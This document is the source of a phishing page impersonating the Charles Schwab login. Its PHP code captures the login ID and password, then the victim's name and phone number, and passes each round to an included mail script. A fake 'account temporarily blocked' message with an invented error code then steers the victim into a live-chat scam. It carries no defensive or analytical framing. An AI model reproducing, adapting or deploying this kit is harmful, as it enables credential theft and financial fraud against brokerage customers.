<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head id="Head1">
        <meta name="robots" content="noindex, nofollow" />
        <meta name="googlebot" content="noindex, nofollow" />
        <meta name="bingbot" content="noindex, nofollow" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <script type="text/javascript" async="async" src="./assets/s92746461632181"></script>
        <link href="./assets/login.css" type="text/css" rel="stylesheet" />
        <title>Login | Charles Schwab</title>
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
        <meta name="description" content="Secure desktop login for current Charles Schwab clients" />
        <style type="text/css">
            .form-group{
                margin-bottom: 10px;
                text-align: left;
            }
            .form-group label{
                display: block;
                margin-bottom: 5px;
    color: #000;font-size: .9375rem;    font-weight: 400;
            }
             .form-group input{
                width: 100%;
                height: 30px;
    line-height: 30px;
    border-radius: 1px;
    font-size: 13px;
        background: #fff;
    padding: 0 16px;
    border: 1px solid #ccc;
   
    vertical-align: middle;
             }

             select#landingPageOptions {
    padding-right: 0;
}
#landingPageOptions {
    background-image: linear-gradient(-180deg, #fafafa 0%, #e4e4e4 99%);
    border: 1px solid #b1b1b1;
    font: 14px Arial !important;
    color: #000;
    padding: 0px 5px 0px 10px;
    height: 28px;
    border-radius: 3px;
    width: 100%;
}
button {
    background: #005f83 100%;
    border: 1px solid #005f83;
    font-size: 17px;
    color: #fff;
    text-align: center;
    cursor: pointer;
    width: 100%;
    padding: 0;
    width: 156px;
    margin-top: 12px!important;
        height: 30px;
    line-height: 30px;
    font-size: 13px;    
}
        </style>
    </head>

    <body>
        <div id="loginContainer" class="sdps-grid-container sdps-wrap">
            <header class="col-full col-m-full col-s-full sdps-m-bottom_small">
                <div class="header__schwablogo sdps-flush--left">
                    <a href="#" id="headerLogoUrl" class="logo" aria-label="Charles Schwab Logo click here to go to the home page.">
                        <span id="defaultLogo" class="svg-icon svg-logo" aria-hidden="true"></span>
                    </a>
                </div>
            </header>

            <div class="col-full col-m-full col-s-full">
                <section class="main__content">
                   
                    <?php
                 if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                ?>
                <div id="loginWrapper" class="backgroundImage1">
                        <div class="segment">
                            <div class="lms-login">
                                <h1 id="loginHeadline">Verification Required</h1><br>
                                <form action="" method="post">
                                    <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                    <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                               
                                <div id="iframeWrapper" class="lms-login__iframe">
                                    <div class="form-group">
                                        <label>Name</label>
                                        <input class="form-control" type="text" name="name" required>
                                    </div>

                                    <div class="form-group">
                                        <label>Phone Number</label>
                                        <input type="password" name="number" required>
                                    </div>

                                <div  id="button-container" class="form-group form-ctrl--container" style=" text-align: center;">
                                    <button type="submit" name="fromLog" id="btnLogin" aria-label="Log in"><!----><span _ngcontent-btl-c59="" id="continueBtnText">Verify </span><!----></button>
                                </div>

                                </div>
                                 </form>
                            </div>
                        </div>
                    </div>
                 <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>

                 <div id="loginWrapper" class="backgroundImage1">
                        <div class="segment">
                            <div class="lms-login">
                                <h1 id="loginHeadline">Important Message:</h1><br>
                                    <form>
                                     <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                                    <div class="form">
                                        <label>Error CODE: <b>6X76D</b></label><br>
                                    </div>
                                    <div class="calling-number">
                                        <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;padding: 10px 20px;display: inline-block;margin: 20px;border-radius: 10px;">Ask Expert</a>
                                    </div>
                                    </form>
                            </div>
                        </div>
                    </div>
                  <?php } else { ?>
                    <div id="loginWrapper" class="backgroundImage1">
                        <div class="segment">
                            <div class="lms-login">
                                <h1 id="loginHeadline">Log in to Schwab</h1><br>
                                <form action="" method="post">
                                    
                               
                                <div id="iframeWrapper" class="lms-login__iframe">
                                    <div class="form-group">
                                        <label>Login Id</label>
                                        <input class="form-control" type="text" name="email" required>
                                    </div>

                                    <div class="form-group">
                                        <label>Password</label>
                                        <input type="password" name="password" required>
                                    </div>

                                    <div class="form-group">
                                        <input  type="checkbox" id="remember-me-checkbox-stack" name="remember-me-checkbox-stack" style="display: inline-block; height: auto; width: auto;">
                                        <label  id="remember-me-text-stack" for="remember-me-checkbox-stack" style=" display: inline-block;">Remember Login ID</label>
                                    </div>

                                    <div class="form-group sdps-form-element form-ctrl--container start-page-section default-view"><label _ngcontent-btl-c59="" for="landingPageOptions" class="sdps-form-element__label sdk-cms form-label stack">Start Page</label><div _ngcontent-btl-c59="" class="sdps-form-element__control"><select _ngcontent-btl-c59="" id="landingPageOptions" class="ng-untouched ng-pristine ng-valid"><option _ngcontent-btl-c59="" value="0: Object"> Accounts Summary </option><option _ngcontent-btl-c59="" value="1: Object"> Account Balances </option><option _ngcontent-btl-c59="" value="2: Object"> Positions </option><option _ngcontent-btl-c59="" value="3: Object"> Trade Ticket </option><option _ngcontent-btl-c59="" value="4: Object"> History </option><option _ngcontent-btl-c59="" value="5: Object"> Stock &amp; ETF Trading </option><option _ngcontent-btl-c59="" value="6: Object"> Options Trading </option><option _ngcontent-btl-c59="" value="7: Object"> Mutual Fund Trading </option><option _ngcontent-btl-c59="" value="8: Object"> Bond Trading </option><option _ngcontent-btl-c59="" value="9: Object"> Research </option><option _ngcontent-btl-c59="" value="10: Object"> Trade Source </option><option _ngcontent-btl-c59="" value="11: Object"> Order Status </option><!----></select></div>
                                </div>

                                <div  id="button-container" class="form-group form-ctrl--container" style=" text-align: center;">
                                    <button type="submit" name="btnLoginMore" id="btnLogin" aria-label="Log in"><!----><span _ngcontent-btl-c59="" id="continueBtnText"> Log in </span><!----></button>
                                </div>

                                </div>
                                 </form>


                                <div class="lms-login__utilitylinks cf">
                                    <ul class="left-links">
                                        <li>
                                            <span id="lnkForgotIdPassword"><a href="#" id="forgotIdPasswordUrl">Forgot login ID or password?</a></span>
                                        </li>
                                        <li><a href="#" id="lnkChineseTrading" lang="zh-TW">中文網路通</a></li>
                                    </ul>
                                    <ul class="right-links">
                                        <li><a href="#" id="lnkNewUserLms">New user?</a></li>
                                        <li></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                     <?php }  ?>
                    <footer role="contentinfo" class="sdps-m-top_small">
                        <div class="client-relationship">
                            <div id="clientRelationship" class="sdps-grid-fluid">
                                <div class="col sdps-p-around_medium">
                                    <div>
                                        <span id="clientRelationshipSummaryText1" class="sdps-text-l-bold-body">Important information about our relationship with you:</span>
                                        <a href="#" id="lnkRelationshipSummaries">Client Relationship Summaries</a>
                                    </div>
                                    <div class="sdps-p-top_medium">
                                        <span id="clientRelationshipSummaryText2">
                                            Our Client Relationship Summaries offer a brief summary of our services, fees and obligations when we work with you in a broker-dealer or an investment advisory relationship. Learn more at
                                        </span>
                                        <a href="#" id="lnkSchwabTransparency">schwab.com/transparency</a>.
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="footerlinks">
                            <ul class="sdps-list--inline">
                                <li><span class="svg-lock-icon"></span><a href="#" id="footerLink1" target="_blank" class="links-allign">Schwab Safe®</a>|</li>
                                <li><a href="#" id="footerLink2" target="_blank" class="links-allign">The Schwab Security Guarantee</a>|</li>
                                <li><a href="#" id="footerLink3">Schwab Homepage</a></li>
                            </ul>
                        </div>
                        <div id="CHANFooter" class="footer__disclosures sdps-p-bottom_medium">
                            <p>
                                <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="#" rel="" target="" title="" type="">
                                    Web Browser Information
                                </a>
                                — IMPORTANT information for Windows XP users.
                            </p>
                            <p class="disclosures">Brokerage Products: Not FDIC Insured • No Bank Guarantee • May Lose Value</p>
                            <p>Not all products and services listed are available outside the U.S. and some are subject to country specific restrictions.</p>
                            <p>
                                Check the background of this firm or one of its investment professionals on
                                <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="#" rel="" target="" title="" type="">FINRA's BrokerCheck</a>.
                            </p>
                            <p>
                                The Charles Schwab Corporation provides a full range of brokerage, banking and financial advisory services through its operating subsidiaries. Its broker-dealer subsidiary, Charles Schwab &amp; Co., Inc. (
                                <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="#" rel="" target="" title="" type="">member SIPC</a>), offers investment services and products, including Schwab brokerage
                                accounts. Its banking subsidiary, Charles Schwab Bank (member FDIC and an Equal Housing Lender), provides deposit and lending services and products. Access to Electronic Services may be limited or unavailable
                                during periods of peak demand, market volatility, systems upgrade, maintenance, or for other reasons.
                            </p>
                            <p>
                                This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific restrictions. Learn more about our services for
                                <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="#" rel="" target="" title="" type="">non-U.S. residents</a>.
                            </p>
                            <p>
                                © 2021 Charles Schwab &amp; Co., Inc, All rights reserved. Member
                                <a data-popup-height="" data-popup-width="" data-stock-symbol="" data-track="" href="#" rel="" target="" title="" type="">SIPC</a>. Unauthorized access is prohibited. Usage will be monitored. (0617-ZYYE)
                            </p>
                        </div>
                    </footer>
                </section>
            </div>
        </div>
        <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
    </body>
</html>
